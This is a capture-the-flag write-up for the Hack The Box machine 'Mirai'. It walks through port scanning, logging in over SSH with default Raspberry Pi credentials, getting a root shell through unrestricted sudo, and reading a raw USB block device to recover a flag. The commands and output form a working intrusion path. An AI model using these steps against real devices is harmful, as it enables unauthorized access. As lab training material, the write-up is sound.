# MIRAI

## ENUMERATION

Doing nmap scan gives 3 open ports

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/mirai]
└─$ nmap 10.10.10.48
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 07:29 EDT
Nmap scan report for 10.10.10.48
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 32.10 seconds
                                                                                 
┌──(kali㉿kali)-[~/Downloads/hackthebox/mirai]
└─$ nmap 10.10.10.48 -p 22,53,80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 07:30 EDT
Nmap scan report for 10.10.10.48
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.76 seconds
```

Result of gobuster scan 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/mirai]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.48 -q -t 100 
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.48/admin/]
/swfobject.js         (Status: 200) [Size: 61]   
```

We need a password to login into pi-hole
I searched for default credentials on google and found this ```you could try the default username "pi" with password "raspberry".``` on this [link](https://discourse.pi-hole.net/t/password-for-pre-configured-pi-hole/13629/3)

## SSH

We ssh using the these creds since we are not able to login in the pi-hole web interface

And we are in

```
pi@raspberrypi:~ $ cd Desktop
pi@raspberrypi:~/Desktop $ ls
Plex  user.txt
pi@raspberrypi:~/Desktop $ cat user.txt
```

## USER --> ROOT

I used the ```sudo -l``` to check what our user was allowed to run as sudo

```
pi@raspberrypi:~ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:~ $ sudo /bin/bash
root@raspberrypi:/home/pi# whoami
root
root@raspberrypi:/home/pi# cd /root
root@raspberrypi:~# ls
root.txt
root@raspberrypi:~# cat root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```
Offcourse it wouldn't be this easy

## ROOT.TXT

I googled the directory for usb in kali and found this ```# mount /dev/sdc1 /media/usb-drive/ ``` at this [website](https://linuxconfig.org/how-to-mount-usb-drive-on-kali-linux/)

Now we know that the it will be in the ```/dev``` directory

```
root@raspberrypi:/dev# ls -l | grep sdc
root@raspberrypi:/dev# ls -l | grep sd
brw-rw----  1 root disk      8,   0 Aug  6 11:30 sda
brw-rw----  1 root disk      8,   1 Aug  6 11:30 sda1
brw-rw----  1 root disk      8,   2 Aug  6 11:30 sda2
brw-rw----  1 root disk      8,  16 Aug  6 11:30 sdb
root@raspberrypi:/dev# cat sdb
```
At the end of this file we find our flag

